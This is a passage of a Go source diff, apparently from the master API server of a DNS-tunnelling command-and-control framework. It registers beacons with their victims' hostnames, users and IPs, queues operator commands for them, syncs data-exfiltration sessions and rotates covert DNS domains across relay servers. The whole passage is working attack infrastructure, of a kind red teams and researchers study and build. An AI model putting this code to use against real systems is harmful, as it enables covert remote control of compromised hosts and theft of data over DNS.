+		fmt.Printf("[Archon] New DNS server registered: %s. Domain available for per-beacon assignment via dashboard.\n", dnsServerID)
+	}
+
+	// Check for pending domain updates
+	pendingDomains, err := api.db.GetPendingDomainUpdates(dnsServerID)
+	if err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] Warning: Failed to get pending domain updates: %v\n", err)
+		}
+		pendingDomains = nil
+	}
+
+	// If domain updates exist, mark them as delivered
+	if len(pendingDomains) > 0 {
+		if err := api.db.MarkDomainUpdateDelivered(dnsServerID); err != nil {
+			fmt.Printf("[API] Warning: Failed to mark domain updates as delivered: %v\n", err)
+		} else {
+			fmt.Printf("[API] Sent domain update to DNS server %s: %v\n", dnsServerID, pendingDomains)
+		}
+	}
+
+	// Get recently completed exfil sessions (last 5 minutes) to sync distributed progress
+	completedExfilSessions, err := api.db.GetCompletedExfilSessionsForSync(5 * time.Minute)
+	if err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] Warning: Failed to get completed exfil sessions: %v\n", err)
+		}
+		completedExfilSessions = []string{}
+	}
+
+	// Get pending missing chunk requests (tasks/exfils waiting for data)
+	missingChunkRequests, err := api.db.GetPendingMissingChunks(5 * time.Minute)
+	if err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] Warning: Failed to get missing chunk requests: %v\n", err)
+		}
+		missingChunkRequests = []MissingChunkRequest{}
+	}
+
+	// Collect known build formats so DNS servers can decode formatted CHK queries
+	buildFormats, fmtErr := api.db.GetDistinctBuildFormats()
+	if fmtErr != nil {
+		fmt.Printf("[API] Warning: Failed to get build formats: %v\n", fmtErr)
+		buildFormats = []string{}
+	}
+
+	// Collect per-build phase configs so DNS servers can return correct A-record IPs
+	// from the very first query without waiting for async ReportBeacon round-trip
+	buildPhaseConfigs, bpcErr := api.db.GetBuildPhaseConfigs()
+	if bpcErr != nil {
+		fmt.Printf("[API] Warning: Failed to get build phase configs: %v\n", bpcErr)
+		buildPhaseConfigs = map[string]map[string]interface{}{}
+	}
+
+	// Send response with pending caches and domain updates
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(map[string]interface{}{
+		"success":                  true,
+		"message":                  "check-in recorded",
+		"pending_caches":           cacheTasks,
+		"domain_updates":           pendingDomains,
+		"completed_exfil_sessions": completedExfilSessions,
+		"missing_chunk_requests":   missingChunkRequests,
+		"build_formats":            buildFormats,
+		"build_phase_configs":      buildPhaseConfigs,
+		"data": map[string]interface{}{
+			"dns_server_id":    dnsServerID,
+			"timestamp":        time.Now(),
+			"is_first_checkin": isFirstCheckin,
+		},
+	})
+}
+
+// Beacon Management Endpoints
+
+// getDNSServerDomain returns the domain for a DNS server ID, using a 60-second cache
+// to avoid repeated DB queries on every beacon report.
+func (api *APIServer) getDNSServerDomain(serverID string) string {
+	api.dnsServerDomainCacheMu.RLock()
+	if time.Since(api.dnsServerDomainCacheTime) < 60*time.Second {
+		if domain, ok := api.dnsServerDomainCache[serverID]; ok {
+			api.dnsServerDomainCacheMu.RUnlock()
+			return domain
+		}
+	}
+	api.dnsServerDomainCacheMu.RUnlock()
+
+	// Refresh cache
+	servers, err := api.db.GetDNSServers()
+	if err != nil {
+		return "unknown"
+	}
+
+	api.dnsServerDomainCacheMu.Lock()
+	api.dnsServerDomainCache = make(map[string]string)
+	for _, server := range servers {
+		if id, ok := server["id"].(string); ok {
+			if domain, ok := server["domain"].(string); ok {
+				api.dnsServerDomainCache[id] = domain
+			}
+		}
+	}
+	api.dnsServerDomainCacheTime = time.Now()
+	domain, ok := api.dnsServerDomainCache[serverID]
+	api.dnsServerDomainCacheMu.Unlock()
+
+	if ok {
+		return domain
+	}
+	return "unknown"
+}
+
+// handleBeaconReport processes a beacon report from a DNS server
+func (api *APIServer) handleBeaconReport(w http.ResponseWriter, r *http.Request) {
+	var req BeaconReportRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] Failed to decode beacon report: %v\n", err)
+		}
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	if api.config.Debug {
+		fmt.Printf("[API] Beacon report received: %s from DNS server %s\n", req.Beacon.ID, dnsServerID)
+		fmt.Printf("[API]    Hostname: %s, User: %s, OS: %s, IP: %s\n",
+			req.Beacon.Hostname, req.Beacon.Username, req.Beacon.OS, req.Beacon.IPAddress)
+		fmt.Printf("[API]    FirstSeen: %v, LastSeen: %v\n", req.Beacon.FirstSeen, req.Beacon.LastSeen)
+	}
+
+	// Check if beacon_name is actually a build ID
+	var resolvedBuildID string
+	if req.Beacon.BeaconName != "" {
+		if buildConfig, _ := api.db.GetBuildConfigByBuildID(req.Beacon.BeaconName); buildConfig != nil {
+			resolvedBuildID = req.Beacon.BeaconName
+			// Restore original beacon name from build config if available
+			if origName, ok := buildConfig["beacon_name"].(string); ok && origName != "" {
+				req.Beacon.BeaconName = origName
+			} else {
+				req.Beacon.BeaconName = ""
+			}
+			// Resolve payload format and encoding from build config
+			if pf, ok := buildConfig["payload_format"].(string); ok && pf != "" && req.Beacon.PayloadFormat == "" {
+				req.Beacon.PayloadFormat = pf
+			}
+			if api.config.Debug {
+				fmt.Printf("[API] Resolved build ID %s for beacon %s\n", resolvedBuildID, req.Beacon.ID)
+			}
+		}
+	}
+
+	err := api.db.UpsertBeacon(
+		req.Beacon.ID,
+		req.Beacon.Hostname,
+		req.Beacon.Username,
+		req.Beacon.OS,
+		req.Beacon.Arch,
+		req.Beacon.IPAddress,
+		dnsServerID,
+		req.Beacon.FirstSeen,
+		req.Beacon.LastSeen,
+		req.Beacon.BeaconName,
+		req.Beacon.PayloadFormat,
+		req.Beacon.Encoding,
+		resolvedBuildID,
+		req.Beacon.RegistrationStage,
+	)
+
+	if err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] Error storing beacon: %v\n", err)
+		}
+		api.sendError(w, http.StatusInternalServerError, "failed to register beacon")
+		return
+	}
+
+	// Record that this beacon contacted this DNS server
+	// Get the DNS domain for this server (cached to avoid N+1 DB queries)
+	dnsDomain := api.getDNSServerDomain(dnsServerID)
+
+	// Track beacon DNS contact (async, don't fail the response if this errors)
+	go func(beaconID, serverID, domain string) {
+		if err := api.db.RecordBeaconDNSContact(beaconID, serverID, domain); err != nil {
+			if api.config.Debug {
+				fmt.Printf("[API] Warning: Failed to record beacon DNS contact: %v\n", err)
+			}
+		}
+	}(req.Beacon.ID, dnsServerID, dnsDomain)
+
+	if api.config.Debug {
+		fmt.Printf("[API] Beacon %s stored successfully from DNS server %s\n",
+			req.Beacon.ID, dnsServerID)
+	}
+
+	// Broadcast beacon update to WebSocket clients
+	wsPayload := map[string]interface{}{
+		"id":         req.Beacon.ID,
+		"hostname":   req.Beacon.Hostname,
+		"username":   req.Beacon.Username,
+		"os":         req.Beacon.OS,
+		"ip_address": req.Beacon.IPAddress,
+		"last_seen":  req.Beacon.LastSeen,
+	}
+	if req.Beacon.RegistrationStage != nil {
+		wsPayload["registration_stage"] = *req.Beacon.RegistrationStage
+	}
+	BroadcastBeaconUpdate(wsPayload)
+
+	responseData := map[string]interface{}{
+		"beacon_id":     req.Beacon.ID,
+		"dns_server_id": dnsServerID,
+	}
+
+	// Include phase config from build config so DNS server can cache per-beacon IPs
+	if resolvedBuildID != "" {
+		if buildConfig, _ := api.db.GetBuildConfigByBuildID(resolvedBuildID); buildConfig != nil {
+			phaseConfig := map[string]interface{}{}
+			hasPhase := false
+
+			if regPhase, ok := buildConfig["registration_phase"].(map[string]interface{}); ok {
+				if qt, ok := regPhase["query_type"].(string); ok {
+					phaseConfig["reg_query_type"] = qt
+				}
+				if enc, ok := regPhase["encrypted"].(bool); ok {
+					phaseConfig["reg_encrypted"] = enc
+				}
+				if ip, ok := regPhase["a_record_ack_ip"].(string); ok && ip != "" {
+					phaseConfig["reg_ack_ip"] = ip
+				}
+				hasPhase = true
+			}
+			if pollPhase, ok := buildConfig["poll_phase"].(map[string]interface{}); ok {
+				if qt, ok := pollPhase["query_type"].(string); ok {
+					phaseConfig["poll_query_type"] = qt
+				}
+				if enc, ok := pollPhase["encrypted"].(bool); ok {
+					phaseConfig["poll_encrypted"] = enc
+				}
+				if ip, ok := pollPhase["a_record_ack_ip"].(string); ok && ip != "" {
+					phaseConfig["poll_ack_ip"] = ip
+				}
+				if ip, ok := pollPhase["a_record_task_ip"].(string); ok && ip != "" {
+					phaseConfig["poll_task_ip"] = ip
+				}
+				if secs, ok := pollPhase["txt_follow_up_secs"].(float64); ok {
+					phaseConfig["txt_follow_up_secs"] = int(secs)
+				}
+				hasPhase = true
+			}
+			if exfilPhase, ok := buildConfig["data_exfil_phase"].(map[string]interface{}); ok {
+				if qt, ok := exfilPhase["query_type"].(string); ok {
+					phaseConfig["exfil_query_type"] = qt
+				}
+				if enc, ok := exfilPhase["encrypted"].(bool); ok {
+					phaseConfig["exfil_encrypted"] = enc
+				}
+				if ip, ok := exfilPhase["a_record_ack_ip"].(string); ok && ip != "" {
+					phaseConfig["exfil_ack_ip"] = ip
+				}
+				hasPhase = true
+			}
+
+			if hasPhase {
+				responseData["phase_config"] = phaseConfig
+			}
+		}
+	}
+
+	api.sendSuccess(w, "beacon registered", responseData)
+}
+
+// handleBeaconStatusUpdate handles lightweight status updates from DNS servers
+func (api *APIServer) handleBeaconStatusUpdate(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		BeaconID    string `json:"beacon_id"`
+		Status      string `json:"status"`
+		DNSServerID string `json:"dns_server_id"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request")
+		return
+	}
+
+	if req.BeaconID == "" || req.Status == "" {
+		api.sendError(w, http.StatusBadRequest, "beacon_id and status required")
+		return
+	}
+
+	if err := api.db.UpdateBeaconStatus(req.BeaconID, req.Status); err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to update status")
+		return
+	}
+
+	BroadcastBeaconUpdate(map[string]interface{}{
+		"id":     req.BeaconID,
+		"status": req.Status,
+	})
+
+	api.sendSuccess(w, "status updated", nil)
+}
+
+// handleDNSServerLogs receives forwarded log entries from DNS servers
+func (api *APIServer) handleDNSServerLogs(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		DNSServerID string `json:"dns_server_id"`
+		Entries     []struct {
+			Timestamp string `json:"timestamp"`
+			Level     string `json:"level"`
+			Message   string `json:"message"`
+		} `json:"entries"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request")
+		return
+	}
+
+	for _, entry := range req.Entries {
+		msg := fmt.Sprintf("[DNS:%s] %s", req.DNSServerID, entry.Message)
+		LogInfo("%s", msg)
+		BroadcastLog(entry.Level, msg)
+	}
+
+	if req.DNSServerID != "" && len(req.Entries) > 0 {
+		writeDNSServerLog(req.DNSServerID, req.Entries)
+	}
+
+	api.sendSuccess(w, "logs received", map[string]int{"count": len(req.Entries)})
+}
+
+// handleListBeacons returns all beacons across all DNS servers
+func (api *APIServer) handleListBeacons(w http.ResponseWriter, r *http.Request) {
+	// Parse pagination parameters
+	limit := 50 // default page size
+	if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
+		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 && l <= 500 {
+			limit = l
+		}
+	}
+
+	offset := 0
+	if offsetStr := r.URL.Query().Get("offset"); offsetStr != "" {
+		if o, err := strconv.Atoi(offsetStr); err == nil && o >= 0 {
+			offset = o
+		}
+	}
+
+	// Get all beacons - history is preserved, beacons shown regardless of last_seen time
+	// Frontend determines online/offline status based on last_seen timestamp
+	beacons, err := api.db.GetAllBeaconsPaginated(limit, offset)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacons")
+		return
+	}
+
+	// Get total count for pagination metadata
+	total, err := api.db.CountAllBeacons()
+	if err != nil {
+		// Log error but continue with partial response
+		if api.config.Debug {
+			fmt.Printf("[API] Warning: Failed to count beacons: %v\n", err)
+		}
+		total = len(beacons) // fallback to current page size
+	}
+
+	api.sendJSON(w, map[string]interface{}{
+		"beacons": beacons,
+		"pagination": map[string]interface{}{
+			"total":  total,
+			"limit":  limit,
+			"offset": offset,
+			"count":  len(beacons),
+		},
+	})
+}
+
+// handleGetBeacon returns details for a specific beacon
+func (api *APIServer) handleGetBeacon(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	beaconID := vars["id"]
+
+	if api.config.Debug {
+		fmt.Printf("[API] Beacon details requested: %s\n", beaconID)
+	}
+
+	beacon, err := api.db.GetBeacon(beaconID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacon")
+		return
+	}
+
+	if beacon == nil {
+		api.sendError(w, http.StatusNotFound, "beacon not found")
+		return
+	}
+
+	// Augment with build config if beacon has a build ID
+	if bid, ok := beacon["build_id"].(string); ok && bid != "" {
+		if buildConfig, err := api.db.GetBuildConfigByBuildID(bid); err == nil && buildConfig != nil {
+			beacon["build_config"] = buildConfig
+		}
+	}
+
+	api.sendJSON(w, beacon)
+}
+
+// handleGetBeaconBuildConfig returns the build config for a specific beacon
+func (api *APIServer) handleGetBeaconBuildConfig(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	beaconID := vars["id"]
+
+	beacon, err := api.db.GetBeacon(beaconID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacon")
+		return
+	}
+	if beacon == nil {
+		api.sendError(w, http.StatusNotFound, "beacon not found")
+		return
+	}
+
+	bid, _ := beacon["build_id"].(string)
+	if bid == "" {
+		api.sendJSON(w, map[string]interface{}{"message": "no build ID associated"})
+		return
+	}
+
+	buildConfig, err := api.db.GetBuildConfigByBuildID(bid)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve build config")
+		return
+	}
+	if buildConfig == nil {
+		api.sendJSON(w, map[string]interface{}{"message": "build config not found"})
+		return
+	}
+
+	api.sendJSON(w, buildConfig)
+}
+
+// handleListExfilBuildJobs retrieves a list of exfil build jobs
+func (api *APIServer) handleListExfilBuildJobs(w http.ResponseWriter, r *http.Request) {
+	if api.db == nil {
+		api.sendError(w, http.StatusInternalServerError, "database not initialized")
+		return
+	}
+
+	limit := 25
+	if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
+		if value, err := strconv.Atoi(limitStr); err == nil && value > 0 {
+			limit = value
+			if limit > 200 {
+				limit = 200
+			}
+		}
+	}
+
+	offset := 0
+	if offsetStr := r.URL.Query().Get("offset"); offsetStr != "" {
+		if value, err := strconv.Atoi(offsetStr); err == nil && value >= 0 {
+			offset = value
+		}
+	}
+
+	status := strings.TrimSpace(r.URL.Query().Get("status"))
+	status = strings.ToLower(status)
+
+	jobs, total, err := api.db.ListExfilBuildJobs(limit, offset, status)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to load exfil build jobs")
+		return
+	}
+
+	api.sendSuccess(w, "Exfil build jobs retrieved", map[string]interface{}{
+		"jobs": jobs,
+		"pagination": map[string]interface{}{
+			"limit":  limit,
+			"offset": offset,
+			"total":  total,
+			"count":  len(jobs),
+		},
+	})
+}
+
+// handleGetBeaconDNSContacts returns DNS contact history for a beacon
+func (api *APIServer) handleGetBeaconDNSContacts(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	beaconID := vars["id"]
+
+	if api.config.Debug {
+		fmt.Printf("[API] Beacon DNS contacts requested: %s\n", beaconID)
+	}
+
+	contacts, err := api.db.GetBeaconDNSContacts(beaconID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve DNS contacts")
+		return
+	}
+
+	api.sendJSON(w, contacts)
+}
+
+// Per-Beacon Domain Management Endpoints
+
+func (api *APIServer) handleGetBeaconDomains(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	beaconID := vars["id"]
+
+	domains, err := api.db.GetBeaconDomains(beaconID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to get beacon domains")
+		return
+	}
+
+	// Build set of domains already tracked by this beacon
+	existingDomains := make(map[string]bool)
+	for _, d := range domains {
+		if domain, ok := d["domain"].(string); ok {
+			existingDomains[domain] = true
+		}
+	}
+
+	// Add any DNS server domains not already tracked as unchecked entries
+	allServers, _ := api.db.GetDNSServers()
+	for _, server := range allServers {
+		if domain, ok := server["domain"].(string); ok {
+			if !existingDomains[domain] {
+				domains = append(domains, map[string]interface{}{
+					"domain": domain,
+					"active": false,
+				})
+			}
+		}
+	}
+
+	api.sendSuccess(w, "beacon domains retrieved", map[string]interface{}{
+		"domains": domains,
+	})
+}
+
+func (api *APIServer) handleUpdateBeaconDomain(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	beaconID := vars["id"]
+
+	var req struct {
+		Domain string `json:"domain"`
+		Active bool   `json:"active"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	// Ensure domain row exists before toggling — it may only exist in the UI
+	// via DNS server merge and not yet in beacon_domains
+	if err := api.db.AddBeaconDomain(beaconID, req.Domain); err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to ensure domain exists")
+		return
+	}
+
+	if err := api.db.SetBeaconDomainActive(beaconID, req.Domain, req.Active); err != nil {
+		api.sendError(w, http.StatusBadRequest, err.Error())
+		return
+	}
+
+	// Queue update_domains task with current active domains
+	api.queueDomainUpdateForBeacon(beaconID)
+
+	domains, _ := api.db.GetBeaconDomains(beaconID)
+	api.sendSuccess(w, "domain updated — change will be delivered on next beacon check-in", map[string]interface{}{
+		"domains": domains,
+	})
+}
+
+func (api *APIServer) handleAddBeaconDomain(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	beaconID := vars["id"]
+
+	var req struct {
+		Domain string `json:"domain"`
+	}
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+	if req.Domain == "" {
+		api.sendError(w, http.StatusBadRequest, "domain is required")
+		return
+	}
+
+	if err := api.db.AddBeaconDomain(beaconID, req.Domain); err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to add domain")
+		return
+	}
+
+	api.queueDomainUpdateForBeacon(beaconID)
+
+	domains, _ := api.db.GetBeaconDomains(beaconID)
+	api.sendSuccess(w, "domain added — will be delivered on next beacon check-in", map[string]interface{}{
+		"domains": domains,
+	})
+}
+
+// queueDomainUpdateForBeacon creates an update_domains task for the beacon with its active domains
+func (api *APIServer) queueDomainUpdateForBeacon(beaconID string) {
+	activeDomains, err := api.db.GetActiveBeaconDomains(beaconID)
+	if err != nil {
+		log.Printf("[DOMAIN] Failed to get active domains for beacon %s: %v", beaconID, err)
+		return
+	}
+	if len(activeDomains) == 0 {
+		log.Printf("[DOMAIN] No active domains for beacon %s — skipping task creation", beaconID)
+		return
+	}
+	domainsJSON, err := json.Marshal(activeDomains)
+	if err != nil {
+		log.Printf("[DOMAIN] Failed to marshal domains for beacon %s: %v", beaconID, err)
+		return
+	}
+	command := fmt.Sprintf("update_domains:%s", string(domainsJSON))
+	if _, err := api.db.CreateTask(beaconID, command, ""); err != nil {
+		log.Printf("[DOMAIN] Failed to create update_domains task for beacon %s: %v", beaconID, err)
+		return
+	}
+	log.Printf("[DOMAIN] Queued update_domains task for beacon %s with %d domains", beaconID, len(activeDomains))
+}
+
+// Task Management Endpoints
+
+// handleCreateTask creates a new task for a beacon
+func (api *APIServer) handleCreateTask(w http.ResponseWriter, r *http.Request) {
+	var req TaskCreateRequest
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	if len(req.Command) > MaxTaskCommandLength {
+		api.sendError(w, http.StatusBadRequest,
+			fmt.Sprintf("command too long: %d characters (max %d)",
+				len(req.Command), MaxTaskCommandLength))
+		return
+	}
+
+	chunkCount := (len(req.Command) + MaxTaskChunkPayload - 1) / MaxTaskChunkPayload
+	if chunkCount > MaxTaskChunks {
+		api.sendError(w, http.StatusBadRequest,
+			fmt.Sprintf("command requires %d chunks (max %d)", chunkCount, MaxTaskChunks))
+		return
+	}
+
+	operatorID := r.Header.Get("X-Operator-ID")
+	username := r.Header.Get("X-Operator-Username")
+
+	// Create task in database
+	taskID, err := api.db.CreateTask(req.BeaconID, req.Command, operatorID)
+	if err != nil {
+		if api.config.Debug {
+			fmt.Printf("[API] Failed to create task: %v\n", err)
+		}
+		api.sendError(w, http.StatusInternalServerError, fmt.Sprintf("failed to create task: %v", err))
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Task %s created by %s: '%s' for beacon %s\n",
+			taskID, username, req.Command, req.BeaconID)
+	}
+
+	// Log task creation
+	api.db.LogAuditEvent(operatorID, "task_create", "task", taskID,
+		fmt.Sprintf("Created task for beacon %s: %s", req.BeaconID, req.Command), r.RemoteAddr)
+
+	api.sendSuccess(w, "task created", map[string]interface{}{
+		"task_id":     taskID,
+		"beacon_id":   req.BeaconID,
+		"command":     req.Command,
+		"status":      "pending",
+		"chunk_count": chunkCount,
+	})
+}
+
+// handleListTasks returns all tasks
+func (api *APIServer) handleListTasks(w http.ResponseWriter, r *http.Request) {
+	// Parse pagination parameters
+	limit := 100 // default page size
+	if limitStr := r.URL.Query().Get("limit"); limitStr != "" {
+		if l, err := strconv.Atoi(limitStr); err == nil && l > 0 && l <= 1000 {
+			limit = l
+		}
+	}
+
+	offset := 0
+	if offsetStr := r.URL.Query().Get("offset"); offsetStr != "" {
+		if o, err := strconv.Atoi(offsetStr); err == nil && o >= 0 {
+			offset = o
+		}
+	}
+
+	// Get paginated tasks
+	tasks, err := api.db.GetAllTasksPaginated(limit, offset)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve tasks")
+		return
+	}
+
+	// Get total count for pagination metadata
+	total, err := api.db.CountAllTasks()
+	if err != nil {
+		// Log error but continue with partial response
+		if api.config.Debug {
+			fmt.Printf("[API] Warning: Failed to count tasks: %v\n", err)
+		}
+		total = len(tasks) // fallback to current page size
+	}
+
+	api.sendJSON(w, map[string]interface{}{
+		"tasks": tasks,
+		"pagination": map[string]interface{}{
+			"total":  total,
+			"limit":  limit,
+			"offset": offset,
+			"count":  len(tasks),
+		},
+	})
+}
+
+// handleGetTask returns details for a specific task
+func (api *APIServer) handleGetTask(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	taskID := vars["id"]
+
+	task, err := api.db.GetTaskWithResult(taskID)
+	if err != nil {
+		if err.Error() == "task not found" {
+			api.sendError(w, http.StatusNotFound, "task not found")
+		} else {
+			api.sendError(w, http.StatusInternalServerError, "failed to retrieve task")
+		}
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Task details retrieved: %s (status: %s)\n", taskID, task["status"])
+	}
+
+	api.sendJSON(w, task)
+}
+
+// handleGetTaskStatus returns the current status of a task
+func (api *APIServer) handleGetTaskStatus(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	taskID := vars["id"]
+
+	// Get task from database (lightweight query, no result data)
+	task, err := api.db.GetTaskWithResult(taskID)
+	if err != nil {
+		if err.Error() == "task not found" {
+			api.sendError(w, http.StatusNotFound, "task not found")
+		} else {
+			api.sendError(w, http.StatusInternalServerError, "failed to retrieve task")
+		}
+		return
+	}
+
+	// Return just the status
+	api.sendJSON(w, map[string]interface{}{
+		"status": task["status"],
+	})
+}
+
+// handleGetTaskResult returns the result for a specific task
+func (api *APIServer) handleGetTaskResult(w http.ResponseWriter, r *http.Request) {
+	vars := mux.Vars(r)
+	taskID := vars["id"]
+
+	resultData, isComplete, err := api.db.GetTaskResult(taskID)
+
+	if err != nil {
+		if err.Error() == "no result found" {
+			api.sendError(w, http.StatusNotFound, "result not found")
+		} else {
+			api.sendError(w, http.StatusInternalServerError, "failed to retrieve result")
+		}
+		return
+	}
+
+	if !isComplete {
+		// Partial result - return progress
+		received, total, _ := api.db.GetTaskResultProgress(taskID)
+		api.sendJSON(w, map[string]interface{}{
+			"task_id":      taskID,
+			"is_complete":  false,
+			"progress":     fmt.Sprintf("%d/%d chunks", received, total),
+			"received":     received,
+			"total_chunks": total,
+		})
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Task result retrieved: %s (%d bytes)\n", taskID, len(resultData))
+	}
+
+	// Complete result
+	api.sendJSON(w, map[string]interface{}{
+		"task_id":     taskID,
+		"is_complete": true,
+		"result":      resultData,
+		"size":        len(resultData),
+	})
+}
+
+// handleGetTasksForDNSServer returns pending tasks for a specific DNS server
+func (api *APIServer) handleGetTasksForDNSServer(w http.ResponseWriter, r *http.Request) {
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	tasks, err := api.db.GetTasksForDNSServer(dnsServerID)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve tasks")
+		return
+	}
+
+	// CRITICAL FIX: Don't mark tasks as 'sent' when polled by DNS server
+	// Tasks should remain 'pending' until actually delivered to beacon in handleCheckin
+	// This allows Shadow Mesh to work correctly - any DNS server can deliver the task
+	// DNS servers have deduplication logic in AddTaskFromMaster to prevent re-queueing
+	//
+	// Previous behavior would mark tasks 'sent' immediately on poll, which meant:
+	// 1. Server A polls, gets task T1, Archon marks T1 as 'sent'
+	// 2. Beacon checks into Server B (Shadow Mesh rotation)
+	// 3. Server B polls, gets nothing (T1 already 'sent')
+	// 4. Task stuck on Server A until beacon contacts it
+	//
+	// Fixed behavior: task remains 'pending' until delivered, any server can deliver it
+
+	if api.config.Debug && len(tasks) > 0 {
+		fmt.Printf("[API] Returning %d task(s) to DNS server %s (status: pending)\n", len(tasks), dnsServerID)
+	}
+
+	// Return tasks array directly (not wrapped in object)
+	w.Header().Set("Content-Type", "application/json")
+	json.NewEncoder(w).Encode(tasks)
+}
+
+// handleGetBeaconsForDNSServer returns all active beacons (for cross-server awareness)
+// This allows DNS servers to know about beacons registered on other servers
+func (api *APIServer) handleGetBeaconsForDNSServer(w http.ResponseWriter, r *http.Request) {
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	// Get all active beacons from master (active = seen in last 10 minutes)
+	beacons, err := api.db.GetActiveBeacons(10)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve beacons")
+		return
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] Beacon list requested by DNS server %s: %d active beacons\n",
+			dnsServerID, len(beacons))
+	}
+
+	api.sendJSON(w, beacons)
+}
+
+// handleDNSServerRegistration handles DNS server registration/heartbeat
+// Returns the list of all active DNS domains for the server to use
+func (api *APIServer) handleDNSServerRegistration(w http.ResponseWriter, r *http.Request) {
+	var req struct {
+		ServerID string `json:"server_id"`
+		Domain   string `json:"domain"`
+		Address  string `json:"address"`
+		APIKey   string `json:"api_key"`
+	}
+
+	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
+		api.sendError(w, http.StatusBadRequest, "invalid request body")
+		return
+	}
+
+	// Validate required fields
+	if req.ServerID == "" || req.Domain == "" || req.APIKey == "" {
+		api.sendError(w, http.StatusBadRequest, "missing required fields: server_id, domain, api_key")
+		return
+	}
+
+	// Verify API key matches (auth middleware may have bypassed for first registration)
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+	if dnsServerID != req.ServerID {
+		api.sendError(w, http.StatusUnauthorized, "server_id mismatch")
+		return
+	}
+
+	// Check if this is an existing DNS server (re-registration) or new registration
+	existingValid, err := api.db.VerifyDNSServerAPIKey(req.ServerID, req.APIKey)
+	if err == nil && existingValid {
+		// Server exists and API key is valid - this is a re-registration (e.g., server restart)
+		// Update the record
+		if api.config.Debug {
+			fmt.Printf("[API] DNS server re-registration: %s (%s)\n", req.ServerID, req.Domain)
+		}
+	} else {
+		// Either server doesn't exist or API key is invalid
+		// This should be a first-time registration from a built binary
+		// The builder should have already created the record, so verify the API key matches
+		// what was embedded in the binary at build time
+		if api.config.Debug {
+			fmt.Printf("[API] DNS server first-time registration: %s (%s)\n", req.ServerID, req.Domain)
+		}
+	}
+
+	// Update or insert DNS server record
+	err = api.db.RegisterDNSServer(req.ServerID, req.Domain, req.Address, req.APIKey)
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to register DNS server")
+		if api.config.Debug {
+			fmt.Printf("[API] DNS server registration error: %v\n", err)
+		}
+		return
+	}
+
+	// Get all active DNS domains to return
+	servers, err := api.db.GetActiveDNSServers()
+	if err != nil {
+		api.sendError(w, http.StatusInternalServerError, "failed to retrieve DNS servers")
+		return
+	}
+
+	// Extract domain list
+	domains := make([]string, 0, len(servers))
+	for _, server := range servers {
+		if domain, ok := server["domain"].(string); ok && domain != "" {
+			domains = append(domains, domain)
+		}
+	}
+
+	if api.config.Debug {
+		fmt.Printf("[API] DNS server registered: %s (%s) - returning %d active domains\n",
+			req.ServerID, req.Domain, len(domains))
+	}
+
+	api.sendSuccess(w, "DNS server registered", map[string]interface{}{
+		"server_id": req.ServerID,
+		"domain":    req.Domain,
+		"domains":   domains,
+	})
+}
+
+// handleGetTaskStatusesForDNSServer returns completed/failed task statuses for DNS servers
+// This allows DNS servers to clear beacon.CurrentTask when Master completes task reassembly
+func (api *APIServer) handleGetTaskStatusesForDNSServer(w http.ResponseWriter, r *http.Request) {
+	dnsServerID := r.Header.Get("X-DNS-Server-ID")
+
+	// Get tasks with completed/failed/partial status that haven't been synced yet
+	tasks, err := api.db.GetCompletedTasksForSync(dnsServerID)
+	if err != nil {
